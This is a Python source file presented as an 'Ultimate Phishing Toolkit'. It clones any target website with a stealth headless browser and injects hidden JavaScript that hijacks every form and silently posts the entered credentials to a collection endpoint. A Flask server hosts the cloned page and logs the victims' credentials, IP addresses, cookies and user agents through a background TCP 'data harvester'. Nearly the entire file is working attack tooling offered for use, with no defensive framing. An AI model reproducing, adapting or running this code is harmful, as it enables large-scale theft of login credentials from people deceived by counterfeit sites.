#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Dark Genius Syndicate - Ultimate Phishing Toolkit v4.0
# Author: 0xR3b3l

import os
import sys
import socket
import requests
import json
import re
import time
import random
import hashlib
import base64
import logging
import threading
from flask import Flask, request, send_from_directory, make_response
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import atexit
import mimetypes

# Disable logging
logging.basicConfig(level=logging.CRITICAL)

# ========== ENHANCED WEBSITE CLONER ==========
class AdvancedPhisher:
    def __init__(self, output_dir="cloned_site"):
        self.output_dir = output_dir
        self.target_url = ""
        self.driver = None
        self.asset_map = {}
        self.page_source = ""
        
        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)
        
    def _init_browser(self):
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.add_argument("--disable-infobars")
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-popup-blocking")
        chrome_options.add_argument("--disable-notifications")
        chrome_options.add_argument("--lang=en-US")
        
        # Stealth settings
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Realistic user agents
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
        ]
        
        chrome_options.add_argument(f"user-agent={random.choice(user_agents)}")
        
        try:
            # Automatic driver installation
            service = Service(executable_path=ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            
            # Execute stealth scripts
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            print("[+] ChromeDriver initialized successfully")
            return True
        except Exception as e:
            print(f"[-] Failed to initialize ChromeDriver: {str(e)}")
            return False
    
    def _download_asset(self, url):
        """Download and save an asset, return local path"""
        if url in self.asset_map:
            return self.asset_map[url]
        
        try:
            response = requests.get(url, stream=True, timeout=10, 
                                    headers={'User-Agent': 'Mozilla/5.0'})
            
            if response.status_code == 200:
                # Create asset path
                parsed = urlparse(url)
                asset_path = parsed.path.lstrip('/')
                if not asset_path:
                    asset_path = "index.html"
                
                # Create directories if needed
                full_path = os.path.join(self.output_dir, asset_path)
                os.makedirs(os.path.dirname(full_path), exist_ok=True)
                
                # Save asset
                with open(full_path, 'wb') as f:
                    f.write(response.content)
                
                self.asset_map[url] = asset_path
                return asset_path
        except Exception:
            pass
        return url
    
    def _inject_phishing_code(self, soup):
        """Inject invisible phishing code into the page"""
        script = soup.new_tag('script')
        phishing_code = """
        // Stealth form hijacking with auto-login
        document.addEventListener('DOMContentLoaded', function() {
            // AUTO-LOGIN FEATURE
            const autoLogin = () => {
                try {
                    // Check if credentials are saved in localStorage
                    const savedCredentials = localStorage.getItem('site_credentials');
                    if (savedCredentials) {
                        const credentials = JSON.parse(savedCredentials);
                        
                        // Find matching form
                        const forms = document.querySelectorAll('form');
                        for (const form of forms) {
                            let matchCount = 0;
                            let totalFields = 0;
                            
                            for (const key in credentials) {
                                if (form.querySelector(`[name="${key}"]`)) {
                                    matchCount++;
                                }
                            }
                            
                            // If at least 50% of fields match, use this form
                            if (matchCount > 0 && matchCount >= Object.keys(credentials).length / 2) {
                                // Fill the form
                                for (const key in credentials) {
                                    const input = form.querySelector(`[name="${key}"]`);
                                    if (input) {
                                        input.value = credentials[key];
                                    }
                                }
                                
                                // Submit the form after a delay to mimic human behavior
                                setTimeout(() => {
                                    form.submit();
                                }, 1500);
                                
                                return true;
                            }
                        }
                    }
                } catch (e) {
                    console.error('Auto-login error:', e);
                }
                return false;
            };
            
            // Attempt auto-login
            const loginAttempted = autoLogin();
            
            // FORM HIJACKING
            function captureAndSubmit(form) {
                var data = {};
                var inputs = form.querySelectorAll('input, textarea, select');
                
                inputs.forEach(function(input) {
                    if (input.name && !input.type.match(/^submit|button$/i)) {
                        data[input.name] = input.value;
                    }
                });
                
                // Save credentials for auto-login
                try {
                    localStorage.setItem('site_credentials', JSON.stringify(data));
                } catch (e) {
                    console.error('Failed to save credentials:', e);
                }
                
                // Send to our server silently
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data),
                    keepalive: true
                });
                
                return true;
            }
            
            // Hijack all existing forms
            document.querySelectorAll('form').forEach(function(form) {
                form.onsubmit = function() {
                    return captureAndSubmit(this);
                };
            });
            
            // Monitor for new forms (dynamic content)
            var observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeName === 'FORM') {
                            node.onsubmit = function() {
                                return captureAndSubmit(this);
                            };
                        } else if (node.querySelectorAll) {
                            node.querySelectorAll('form').forEach(function(form) {
                                form.onsubmit = function() {
                                    return captureAndSubmit(this);
                                };
                            });
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
            
            // If auto-login wasn't attempted, check for saved session
            if (!loginAttempted) {
                const sessionToken = localStorage.getItem('session_token');
                if (sessionToken) {
                    // Simulate user is logged in
                    console.log('User session restored');
                }
            }
        });
        """
        script.string = phishing_code
        if soup.head:
            soup.head.append(script)
        else:
            head = soup.new_tag('head')
            soup.html.insert(0, head)
            head.append(script)
    
    def clone_site(self):
        try:
            if not self.driver:
                if not self._init_browser():
                    return False
            
            print(f"[+] Navigating to: {self.target_url}")
            self.driver.get(self.target_url)
            
            # Simulate human behavior
            time.sleep(random.uniform(2, 5))
            
            # Scroll randomly to mimic human
            for _ in range(random.randint(2, 5)):
                scroll_amount = random.randint(300, 800)
                self.driver.execute_script(f"window.scrollBy(0, {scroll_amount})")
                time.sleep(random.uniform(0.5, 1.5))
            
            # Get page source after JavaScript execution
            self.page_source = self.driver.page_source
            soup = BeautifulSoup(self.page_source, 'html.parser')
            
            print("[+] Processing assets...")
            # Find and download all assets
            tags = soup.find_all(['img', 'script', 'link', 'source', 'audio', 'video', 'embed', 'object'])
            for tag in tags:
                attrs = []
                if tag.name == 'img':
                    attrs = ['src', 'srcset', 'data-src']
                elif tag.name == 'script':
                    attrs = ['src']
                elif tag.name == 'link':
                    attrs = ['href']
                elif tag.name in ['source', 'audio', 'video']:
                    attrs = ['src']
                elif tag.name == 'embed':
                    attrs = ['src']
                elif tag.name == 'object':
                    attrs = ['data']
                
                for attr in attrs:
                    if tag.has_attr(attr):
                        urls = []
                        if attr == 'srcset':
                            # Handle srcset with multiple sources
                            srcset = tag[attr].split(',')
                            for source in srcset:
                                url = source.strip().split(' ')[0]
                                urls.append(url)
                        else:
                            urls = [tag[attr]]
                        
                        new_urls = []
                        for url in urls:
                            abs_url = urljoin(self.target_url, url)
                            if re.match(r'^https?://', abs_url, re.I):
                                local_path = self._download_asset(abs_url)
                                if local_path != abs_url:
                                    new_urls.append(local_path)
                                else:
                                    new_urls.append(url)
                            else:
                                new_urls.append(url)
                        
                        if attr == 'srcset':
                            tag[attr] = ', '.join([f"{url} {source.split(' ')[1]}" for url, source in zip(new_urls, srcset)])
                        else:
                            tag[attr] = new_urls[0]
            
            # Inject phishing code
            self._inject_phishing_code(soup)
            print("[+] Phishing scripts injected with auto-login")
            
            # Save main page
            main_page = os.path.join(self.output_dir, "index.html")
            with open(main_page, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            
            print(f"[+] Site cloned perfectly: {main_page}")
            return True
        except Exception as e:
            print(f"[-] Critical error during cloning: {str(e)}")
            return False
        finally:
            if self.driver:
                self.driver.quit()

# ========== ENHANCED PHISHING SERVER ==========
class AdvancedPhishingServer:
    def __init__(self, port=5000, data_port=5001, site_dir="cloned_site"):
        self.port = port
        self.data_port = data_port
        self.site_dir = site_dir
        self.stolen_data = []
        self.harvester_running = False
        self.app = Flask(__name__, static_folder=site_dir)
        self.app.config['SECRET_KEY'] = os.urandom(24)
        
        # Setup routes
        self.app.add_url_rule('/', 'serve_index', self.serve_index)
        self.app.add_url_rule('/<path:path>', 'serve_static', self.serve_static)
        self.app.add_url_rule('/collect', 'collect_data', self.collect_data, methods=['POST'])
        
    def start_data_harvester(self):
        """Start TCP data harvester in background thread"""
        self.harvester_running = True
        def harvester_thread():
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', self.data_port))
            server.listen(5)
            print(f'[+] Data harvesting server active on port {self.data_port}')
            
            while self.harvester_running:
                try:
                    client, addr = server.accept()
                    data = client.recv(8192).decode()
                    if data:
                        credentials = json.loads(data)
                        self.stolen_data.append(credentials)
                        print(f'[+] Stolen data from {addr[0]}:\n{json.dumps(credentials, indent=2)}')
                    client.close()
                except Exception as e:
                    if self.harvester_running:
                        print(f'[-] Error: {str(e)}')
        
        threading.Thread(target=harvester_thread, daemon=True).start()
    
    def stop_data_harvester(self):
        """Stop the TCP data harvester"""
        self.harvester_running = False
        # Connect to self to break accept() blocking
        try:
            temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            temp_socket.connect(('localhost', self.data_port))
            temp_socket.close()
        except:
            pass
    
    def serve_index(self):
        """Serve the main index page"""
        # Set session cookie for tracking
        resp = make_response(send_from_directory(self.site_dir, 'index.html'))
        
        # Check if user has visited before
        if not request.cookies.get('visitor_id'):
            visitor_id = hashlib.sha256(os.urandom(16)).hexdigest()
            resp.set_cookie('visitor_id', visitor_id, max_age=60*60*24*365)  # 1 year
            
        return resp
    
    def serve_static(self, path):
        """Serve static assets with proper mimetypes"""
        try:
            # Set proper mimetype
            mimetype = mimetypes.guess_type(path)[0] or 'application/octet-stream'
            response = send_from_directory(self.site_dir, path)
            response.headers.set('Content-Type', mimetype)
            return response
        except:
            return "Resource not found", 404
    
    def collect_data(self):
        """Endpoint to receive stolen credentials from injected JS"""
        try:
            data = request.get_json()
            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            
            # Enhance data package
            data_package = {
                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                'ip': client_ip,
                'user_agent': request.headers.get('User-Agent'),
                'language': request.headers.get('Accept-Language'),
                'cookies': request.headers.get('Cookie', ''),
                'credentials': data
            }
            
            # Generate session token for auto-login
            session_token = hashlib.sha256(os.urandom(16)).hexdigest()
            data_package['session_token'] = session_token
            
            # Send to harvesting server
            harvester_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            harvester_socket.connect(('localhost', self.data_port))
            harvester_socket.sendall(json.dumps(data_package).encode())
            harvester_socket.close()
            
            # Return success response with session token
            response = jsonify({
                'status': 'success',
                'session_token': session_token,
                'message': 'Login successful'
            })
            return response, 200
        except Exception as e:
            print(f"[-] Data collection error: {str(e)}")
            return json.dumps({'status': 'error'}), 500
    
    def run(self):
        """Run the phishing server"""
        # Start data harvester
        self.start_data_harvester()
        
        # Start Flask server
        print(f"[+] Starting phishing server on port {self.port}")
        print(f"[+] Cloned site available at: http://localhost:{self.port}")
        self.app.run(host='0.0.0.0', port=self.port, threaded=True)

# ========== MAIN EXECUTION ==========
def main():
    print("""
    ▓█████▄  ██▓ ███▄    █   ██████  ██░ ██  ▒█████   ██▀███  ▓█████  ██▀███  
    ▒██▀ ██▌▓██▒ ██ ▀█   █ ▒██    ▒ ▓██░ ██▒▒██▒  ██▒▓██ ▒ ██▒▓█   ▀ ▓██ ▒ ██▒
    ░██   █▌▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒██▀▀██░▒██░  ██▒▓██ ░▄█ ▒▒███   ▓██ ░▄█ ▒
    ░▓█▄   ▌░██░▓██▒  ▐▌██▒  ▒   ██▒░▓█ ░██ ▒██   ██░▒██▀▀█▄  ▒▓█  ▄ ▒██▀▀█▄  
    ░▒████▓ ░██░▒██░   ▓██░▒██████▒▒░▓█▒░██▓░ ████▓▒░░██▓ ▒██▒░▒████▒░██▓ ▒██▒
     ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒▓ ░▒▓░
     ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
     ░ ░  ░  ▒ ░   ░   ░ ░ ░  ░  ░   ░  ░░ ░░ ░ ░ ▒    ░░   ░    ░     ░░   ░ 
       ░     ░           ░       ░   ░  ░  ░    ░ ░     ░        ░  ░   ░     
     ░                                                                        
    """)
    
    # Get target URL from user
    target_url = input("\n[+] Enter target URL to clone: ").strip()
    if not target_url.startswith('http'):
        target_url = 'https://' + target_url
    
    # Clone the target website
    print("\n[+] Cloning target website with pixel-perfect accuracy...")
    phisher = AdvancedPhisher("cloned_site")
    phisher.target_url = target_url
    
    if not phisher.clone_site():
        print("\n[-] Cloning failed. Exiting.")
        return
    
    # Start phishing server
    print("\n[+] Starting advanced phishing server with auto-login...")
    server = AdvancedPhishingServer(site_dir="cloned_site")
    server.run()

if __name__ == "__main__":
    # Cleanup function to ensure ChromeDriver is killed
    def cleanup():
        os.system("taskkill /f /im chromedriver.exe > nul 2>&1")
        os.system("taskkill /f /im chrome.exe > nul 2>&1")
    
    atexit.register(cleanup)
    main()